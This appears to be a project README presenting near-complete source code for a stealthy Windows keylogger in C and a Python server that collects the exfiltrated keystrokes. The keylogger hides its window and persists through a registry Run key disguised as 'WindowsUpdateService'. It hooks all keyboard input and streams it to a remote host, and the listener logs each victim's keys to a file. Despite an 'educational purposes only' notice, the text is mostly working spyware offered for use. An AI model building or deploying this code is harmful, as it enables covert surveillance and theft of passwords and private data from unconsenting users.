# Keylogger with Exfiltration Functions

## Overview

**This project consists of two parts:**

* A **Keylogger implemented in C** that captures keystrokes on a Windows machine and exfiltrates the data over a network connection.

* A **Python-based listener server** that receives and saves the logged keystrokes remotely.

This solution demonstrates:

* Basic keylogging
* Persistence via registry
* Non-blocking socket communication
* Asynchronous I/O handling for multiple clients

---

## Features

* Stealthy keylogger that hides its console window
* Persistence by adding itself to the Windows startup registry
* Non-blocking TCP socket connection for efficient network communication
* Converts virtual key presses to human-readable strings
* Real-time exfiltration of keystrokes to a remote server
* Python listener uses `selectors` for scalable, efficient multiple client handling
* Automatically saves keystrokes into uniquely named files per client connection

---

## Requirements

### For Keylogger (C)

* Windows OS (required for Windows API usage)
* C compiler supporting Windows headers (e.g., MSVC)

### For Listener (Python)

* Python 3.x
* Uses only Python standard libraries (no external dependencies)

---

## Usage

1. **Compile and run the C keylogger** on the target Windows machine.
2. **Run the Python listener server** on the designated remote host with matching IP and port settings.
3. The keylogger will connect and send captured keystrokes to the listener in real-time.
4. The listener saves received keystrokes to files named after each client’s IP and port.

---

## Security and Legal Notice

This software is intended for **educational purposes only**.
Unauthorized use on machines without explicit permission is illegal and unethical.
Always obtain proper authorization before running keylogging software or network monitoring tools.

---


# *Part 1 - Keylogger*

#### How Does This Work?

1. **Include Important Headers**

```c
#define WIN32_LEAN_AND_MEAN

#include <Windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "advapi32.lib")
````

2. **Define Server IP, Port, and Retry Parameters**

```c
#define SERVER_IP "192.168.1.6"
#define SERVER_PORT 5678

#define RETRY_TIME 3000 // 3 seconds
#define MAX_RETRIES 100 // retry 100 times
```

3. **TryConnect Function**

Attempts to establish a non-blocking connection, returning success or failure.

```c
int TryConnect(SOCKET sock, struct sockaddr_in* addr) {
    int result = connect(sock, (struct sockaddr*)addr, sizeof(*addr));
    if (result == SOCKET_ERROR) {
        int err = WSAGetLastError();
        if (err == WSAEWOULDBLOCK || err == WSAEINPROGRESS) {
            fd_set writeSet;
            FD_ZERO(&writeSet);
            FD_SET(sock, &writeSet);

            struct timeval timeout;
            timeout.tv_sec = 5;
            timeout.tv_usec = 0;

            result = select(0, NULL, &writeSet, NULL, &timeout);
            if (result > 0 && FD_ISSET(sock, &writeSet)) {
                int sockErr = 0;
                int len = sizeof(sockErr);
                getsockopt(sock, SOL_SOCKET, SO_ERROR, (char*)&sockErr, &len);
                return (sockErr == 0); // 1 = success
            }
        }
        return 0;
    }
    return 1; // Connected immediately
}
```

4. **Create Non-blocking Socket**

Creates a TCP socket in non-blocking mode for asynchronous operations.

```c
SOCKET CreateNonBlockingSocket() {
    SOCKET newSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (newSock == INVALID_SOCKET) {
        return INVALID_SOCKET;
    }
    u_long mode = 1;
    if (ioctlsocket(newSock, FIONBIO, &mode) != NO_ERROR) {
        closesocket(newSock);
        return INVALID_SOCKET;
    }
    return newSock;
}
```

5. **Map Virtual Keys to Strings**

Converts virtual key codes to readable strings for logging or sending.

```c
const char* GetKeyString(DWORD vkCode) {
    switch (vkCode) {
        // Mouse buttons
        case 0x01: return "[LCLICK]";
        case 0x02: return "[RCLICK]";
        case 0x04: return "[MBUTTON]";

        // Control keys
        case VK_BACK: return "[BACKSPACE]";
        case VK_TAB: return "[TAB]";
        case VK_RETURN: return "[ENTER]";
        case VK_SHIFT: return "[SHIFT]";
        case VK_CONTROL: return "[CTRL]";

        // ...SNIP other keys for brevity...

        default:
            return "[UNKNOWN]";
    }
}
```

6. **Hide Console Window**

Prevents the console window from showing to keep the program stealthy.

```c
void HideConsole() {
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, 0);
}
```

7. **Add Program to Startup**

Adds the executable path to the Windows registry for persistence after reboot.

```c
void AddToStartup(const char* exePath, const char* entryName) {
    HKEY hKey;
    RegOpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey);
    RegSetValueEx(hKey, entryName, 0, REG_SZ, (const BYTE*)exePath, strlen(exePath) + 1);
    RegCloseKey(hKey);
}
```

8. **Send Data to Remote Host**

Sends captured key strings to the connected remote server.

```c
void sendtoremotehost(const char* Data) {
    if (ConnectSocket == INVALID_SOCKET) return;

    int result = send(ConnectSocket, Data, (int)strlen(Data), 0);
    if (result == SOCKET_ERROR) {
        int err = WSAGetLastError();
        if (err != WSAEWOULDBLOCK) {
            closesocket(ConnectSocket);
            ConnectSocket = INVALID_SOCKET;
        }
    }
}
```

9. **Low-level Keyboard Hook Procedure**

Intercepts keypress events and sends the corresponding string to the remote host.

```c
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* kbdStruct = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = kbdStruct->vkCode;
        const char* KeyString = GetKeyString(vkCode);
        if (KeyString) {
            sendtoremotehost(KeyString);
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}
```

* `nCode == HC_ACTION`: Processes only valid keyboard events
* `wParam == WM_KEYDOWN || WM_SYSKEYDOWN`: Only handles key down events

10. **Message Loop for Keyboard Hook**

Keeps the keyboard hook active, processing messages indefinitely.

```c
void LogKeyPressed() {
    HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    UnhookWindowsHookEx(keyboardHook);
}
```

11. **Main Function Overview**

* Hides console window
* Adds executable to startup registry
* Initializes Winsock
* Creates and connects a non-blocking socket to the remote server
* On successful connection, starts logging keys
* On failure, retries after waiting

```c
int main() {
    HideConsole();

    // Add to startup
    char path[MAX_PATH];
    GetModuleFileName(NULL, path, MAX_PATH);
    AddToStartup(path, "WindowsUpdateService");

    // Init Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
        return 1;

    struct sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(SERVER_PORT);
    inet_pton(AF_INET, SERVER_IP, &serverAddr.sin_addr);

    while (1) {
        ConnectSocket = CreateNonBlockingSocket();
        if (ConnectSocket == INVALID_SOCKET) {
            Sleep(RETRY_TIME);
            continue;
        }

        if (TryConnect(ConnectSocket, &serverAddr)) {
            // Connected, launch keylogger
            LogKeyPressed();

            // LogKeyPressed blocks; when done, close socket
            closesocket(ConnectSocket);
        }
        else {
            // Failed to connect
            closesocket(ConnectSocket);
            ConnectSocket = INVALID_SOCKET;
            Sleep(RETRY_TIME);
        }
    }

    WSACleanup();
    return 0;
}
```

# *Part 2 - listener.py*

#### How Does This Work?

##### Part 2 - Listener Server

---

1. **Imports and Setup**

```python
import sys
import socket
import selectors
import types
```

* **sys**: For system-related functions (not explicitly used but common).
* **socket**: To handle network connections.
* **selectors**: Efficient I/O multiplexing to handle multiple connections.
* **types**: To create a simple namespace object for storing connection-specific data.

---

2. **Create a Selector Object**

```python
sel = selectors.DefaultSelector()
```

* Creates a selector object to monitor multiple sockets for I/O readiness without blocking.

---

3. **Define Server IP and Port**

```python
HOST = '192.168.1.6'  # IP address to bind the server socket to
PORT = 5678           # Port number to listen on
```

* Matches the IP and port configured in the C keylogger to ensure connection compatibility.

---

4. **Set up Listening Socket**

```python
lsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
lsock.bind((HOST, PORT))
lsock.listen()
print(f'Listening on {(HOST, PORT)}')
lsock.setblocking(False)
sel.register(lsock, selectors.EVENT_READ, data=None)
```

* Creates a TCP socket.
* Binds it to the specified IP and port.
* Starts listening for incoming connections.
* Prints listening status.
* Sets the socket to non-blocking mode.
* Registers the listening socket with the selector for read events, with `data=None` since it’s a listener socket, not a client connection.

---

5. **Accept New Connections**

```python
def accept_wrapper(sock):
    conn, addr = sock.accept()   # Accept the connection
    print(f'Accepted connection from {addr}')
    conn.setblocking(False)       # Non-blocking client socket

    filename = f'saved_keys_from_{addr[0]}_{addr[1]}.txt'
    file_handle = open(filename, 'ab')  # Open file to append bytes

    data = types.SimpleNamespace(
        addr=addr,
        inb=b'',
        outb=b'',
        file=file_handle
    )
    sel.register(conn, selectors.EVENT_READ, data=data)  # Register client socket for read
```

* Accepts a new incoming client connection.
* Prints the remote client address.
* Sets the client socket to non-blocking.
* Creates a unique file name per client connection to store the received keystroke data.
* Opens the file in append binary mode.
* Creates a namespace object to hold connection info, including the file handle.
* Registers the client socket with the selector for reading incoming data.

---

6. **Handle Client Data Reception**

```python
def service_connection(key, mask):
    sock = key.fileobj
    data = key.data
    try:
        if mask & selectors.EVENT_READ:
            recv_data = sock.recv(1024)  # Read up to 1024 bytes
            if recv_data:
                data.file.write(recv_data)  # Write bytes to file
                data.file.flush()           # Ensure data is written immediately
            else:
                # No data means the client closed connection
                print(f'Closing connection to {data.addr}')
                sel.unregister(sock)
                sock.close()
                data.file.close()
    except Exception as e:
        print(f"Error with {data.addr}: {e}")
        sel.unregister(sock)
        sock.close()
        data.file.close()
```

* Handles read events on client sockets.
* Reads incoming data.
* If data received, writes it to the associated file and flushes.
* If no data, means client disconnected; closes socket and file.
* Catches exceptions, logs errors, and cleans up connection and file.

---

7. **Event Loop**

```python
try:
    while True:
        events = sel.select(timeout=None)
        for key, mask in events:
            if key.data is None:
                accept_wrapper(key.fileobj)  # New incoming connection
            else:
                service_connection(key, mask)  # Existing connection ready to read
except KeyboardInterrupt:
    print('Caught keyboard interrupt, exiting')
finally:
    sel.close()
```

* Runs an infinite loop to wait for events on registered sockets.
* If the event is on the listening socket (`key.data is None`), accept a new connection.
* Otherwise, handle incoming data from a connected client.
* Handles graceful shutdown on Ctrl+C.
* Closes the selector on exit.

---

If you liked this project, please leave a star!  
If you encounter any issues (hopefully not), feel free to contact me.
